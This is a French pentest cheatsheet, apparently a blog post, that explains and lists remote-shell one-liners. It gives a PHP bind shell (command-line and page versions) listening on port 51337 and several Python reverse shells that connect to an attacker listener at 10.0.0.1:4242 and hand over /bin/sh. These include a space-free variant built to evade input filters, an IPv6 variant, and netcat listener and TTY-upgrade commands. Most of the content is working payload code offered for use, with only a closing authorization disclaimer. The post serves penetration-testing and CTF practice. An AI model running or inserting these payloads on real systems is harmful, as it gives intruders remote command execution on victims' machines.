---
title: "Cheatsheet — Bind shell PHP & reverse shell Python"
description: "Deux one-liners à garder sous la main : un bind shell en PHP et un reverse shell en Python, avec le principe, l'explication de chaque fonction et les variantes IPv4/IPv6."
date: 2026-11-24 07:30:00 +0100
categories: [Cheatsheets, Shells]
tags: [php, python, bind-shell, reverse-shell, pentest, netcat]
---

> Deux techniques qu'on retrouve sans arrêt en pentest interne et en CTF : le **bind shell** (la cible ouvre un port et on s'y connecte) et le **reverse shell** (la cible se connecte à nous). Voici les deux one-liners que j'utilise le plus souvent, extraits de la cheat sheet [Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/) de Swissky, avec l'explication de ce qu'il y a derrière chaque caractère.

## 🎯 Choisir entre les deux

| | **Bind shell** | **Reverse shell** |
| --- | --- | --- |
| **Qui initie la connexion** | La cible écoute, l'attaquant se connecte | La cible se connecte à l'attaquant |
| **Sens du flux** | `attaquant → cible` | `cible → attaquant` |
| **Listener requis** | Non, sur la cible | Oui, sur la machine attaquante |
| **Filtrage sortant** | Contourne un egress filtering | Bloqué par un firewall sortant strict |
| **Filtrage entrant** | Bloqué par un firewall entrant | Contourne un firewall entrant |
| **Quand le préférer** | La cible est joignable depuis l'extérieur | La cible peut sortir (HTTP, DNS, port haut) |

En pratique, on tente le **reverse shell en premier** : la plupart des réseaux laissent sortir le trafic, alors qu'ils filtrent l'entrée. Le bind shell sert de repli quand la cible est directement accessible (même LAN, VPN, DMZ mal segmentée).

---

## 🐘 Bind shell en PHP

### Le one-liner

```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);\
socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\
$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);\
socket_write($cl,$m,strlen($m));}}'
```

Les `\` en fin de ligne ne font pas partie du code : ils servent seulement à couper la commande dans le terminal pour qu'elle reste lisible (retour à la ligne échappé).

### Côté attaquant

Une fois la commande lancée sur la cible, il n'y a plus qu'à s'y connecter :

```bash
nc <IP_CIBLE> 51337
```

On obtient un prompt `$ ` et on tape des commandes — la sortie revient dans le terminal.

### Ce que fait chaque morceau

| Instruction | Rôle |
| --- | --- |
| `socket_create(AF_INET, SOCK_STREAM, SOL_TCP)` | Crée un socket TCP IPv4 |
| `socket_bind($s, "0.0.0.0", 51337)` | Attache le socket au port 51337 sur **toutes** les interfaces (`0.0.0.0`) |
| `socket_listen($s, 1)` | Passe en écoute, file d'attente de 1 connexion |
| `socket_accept($s)` | Bloque jusqu'à ce qu'un client se connecte, puis retourne le socket de la session |
| `socket_write($cl, "$ ", 2)` | Envoie le prompt `$ ` au client |
| `socket_read($cl, 100)` | Lit jusqu'à 100 octets — donc une commande courte |
| `popen("$in", "r")` | Exécute la commande et ouvre un pipe en lecture sur sa sortie |
| `fgetc` / `socket_write` | Recopie la sortie caractère par caractère vers le client |
| `while(1)` | Boucle infinie : une commande après l'autre |

Les deux points faibles à connaître : pas de `stderr` (les erreurs ne remontent pas) et une lecture limitée à 100 octets par commande — un long pipeline sera tronqué.

### Quand l'utiliser

Le bind shell PHP est surtout utile en **contexte web** : un `LFI` vers `php://filter`, un upload de fichier, ou une `include` qui permet d'exécuter du code PHP. Si `php -r` n'est pas disponible mais qu'on peut écrire un fichier `.php`, le même code passe dans une page :

```php
<?php
$s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($s, "0.0.0.0", 51337);
socket_listen($s, 1);
$cl = socket_accept($s);
while (1) {
    if (!socket_write($cl, "$ ", 2)) exit;
    $in  = socket_read($cl, 100);
    $cmd = popen($in, "r");
    while (!feof($cmd)) {
        $m = fgetc($cmd);
        socket_write($cl, $m, strlen($m));
    }
}
```

---

## 🐍 Reverse shell en Python

### Version de base (Linux, IPv4)

Le classique, celui qu'on tape par réflexe :

```bash
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

### Côté attaquant — le listener

À lancer **avant** le payload sur la cible :

```bash
nc -lvnp 4242
```

`-l` écoute, `-v` verbeux, `-n` pas de résolution DNS, `-p` port. Avec `rlwrap` devant, on gagne l'historique et `Ctrl+L` pour nettoyer l'écran :

```bash
rlwrap nc -lvnp 4242
```

### Ce que fait chaque morceau

| Instruction | Rôle |
| --- | --- |
| `socket.socket(socket.AF_INET, socket.SOCK_STREAM)` | Crée un socket TCP IPv4 |
| `s.connect(("10.0.0.1", 4242))` | Se connecte au listener de l'attaquant |
| `s.fileno()` | Récupère le descripteur de fichier du socket |
| `os.dup2(fd, 0/1/2)` | Redirige **stdin**, **stdout** et **stderr** vers le socket |
| `pty.spawn("/bin/sh")` | Lance un shell dans un pseudo-terminal — le shell se croit interactif |

Le `pty.spawn` est la touche importante : sans lui, `/bin/sh -i` peut refuser de démarrer ou donner un shell sans prompt, sans `su`, sans autocomplétion. Avec un pty, on a un vrai terminal.

### Variantes utiles

**Avec `subprocess` (sans pty) :**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**En passant par des variables d'environnement** (pratique pour changer d'IP sans réécrire le payload) :

```bash
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

**Sans espaces** — pour passer là où les filtres bloquent l'espace, en remplaçant les `import` par `__import__` et en abrégeant les noms :

```bash
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

**En IPv6** — même chose avec `AF_INET6` et l'adresse entre crochets côté socket :

```bash
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

### Après le shell — passer en TTY complet

Un reverse shell brut est souvent « presque » utilisable : pas de `su`, pas de `nano`, pas de flèches. La formule classique, côté attaquant :

```bash
# dans le shell obtenu
ctrl+z
stty raw -echo; fg
reset
export SHELL=bash
export TERM=xterm-256color
```

Puis ajuster la taille du terminal :

```bash
stty rows <lignes> columns <colonnes>
```

Et si `script` est présent sur la cible, on peut directement s'épargner le `pty` :

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🧠 Ce que je retiens

- **Reverse par défaut, bind en repli** : le sens de la connexion dépend du firewall, pas de la technique. Tester les deux coûte trente secondes.
- Le `dup2` des descripteurs `0`, `1`, `2` est le cœur de tout reverse shell : c'est ce qui fait que le shell parle dans le socket au lieu du terminal local.
- Un **pty** change tout : sans lui, beaucoup de shells « interactifs » ne le sont pas vraiment.
- En PHP, `socket_*` fait le travail mais sans `stderr` et avec une limite de 100 octets par commande — pour du confort, préférer un reverse shell dès que possible.

## 📚 Sources

- [Internal All The Things — Bind Shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/) (section PHP)
- [Internal All The Things — Reverse Shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) (section Python)
- [HackTricks — Reverse Shells (Linux)](https://hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html) : les mêmes payloads (bash, Python, PHP, socat...) avec `explainshell` pour décortiquer chaque commande
- [HackTricks — Full TTYs](https://hacktricks.wiki/en/generic-hacking/reverse-shells/full-ttys.html) : la référence pour transformer un shell brut en terminal complet
- [Pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) : le classique des one-liners (Bash, Perl, Python, PHP, Ruby, Netcat, Java, socat), avec les variantes Windows

---

*Toutes ces techniques ne s'utilisent que sur des systèmes pour lesquels on dispose d'une autorisation explicite.*
